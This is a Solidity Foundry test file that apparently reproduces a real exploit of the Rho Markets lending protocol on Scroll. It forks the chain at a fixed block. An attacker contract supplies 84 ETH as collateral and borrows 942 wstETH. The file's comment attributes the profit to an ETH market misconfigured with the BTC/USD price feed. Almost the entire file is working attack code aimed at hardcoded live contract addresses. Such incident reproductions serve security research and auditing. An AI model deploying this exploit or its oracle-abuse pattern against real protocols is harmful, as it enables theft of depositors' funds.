// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

interface IRhoComptroller {
    function enterMarkets(
        address[] calldata markets
    ) external returns (uint256[] memory);
}

interface IRhoEthMarket {
    function mint() external payable;
}

interface IRhoMarket {
    function borrow(
        uint256 amount
    ) external returns (uint256);
}

contract RhoMarketsAttacker {
    IERC20 private constant WSTETH = IERC20(0xf610A9dfB7C89644979b4A0f27063E9e7d7Cda32);
    IRhoComptroller private constant COMPTROLLER = IRhoComptroller(0x8a67AB98A291d1AEA2E1eB0a79ae4ab7f2D76041);
    IRhoEthMarket private constant RETH = IRhoEthMarket(0x639355f34Ca9935E0004e30bD77b9cE2ADA0E692);
    IRhoMarket private constant RWSTETH = IRhoMarket(0xe4FC4C444efFB5ECa80274c021f652980794Eae6);

    function exploit() external payable {
        RETH.mint{value: msg.value}();

        address[] memory markets = new address[](1);
        markets[0] = address(RETH);
        COMPTROLLER.enterMarkets(markets);

        // ETH was accidentally configured to use the BTC/USD feed, making the
        // supplied ETH worth roughly twenty times its real value.
        require(RWSTETH.borrow(942 ether) == 0, "borrow failed");
    }
}

contract RhoMarketsExploitTest is Test {
    IERC20 private constant WSTETH = IERC20(0xf610A9dfB7C89644979b4A0f27063E9e7d7Cda32);

    function testExploit() public {
        vm.createSelectFork("https://rpc.scroll.io", 7_580_112);

        RhoMarketsAttacker attacker = new RhoMarketsAttacker();
        vm.deal(address(attacker), 84 ether);
        attacker.exploit{value: 84 ether}();

        assertGt(WSTETH.balanceOf(address(attacker)), 900 ether);
    }
}
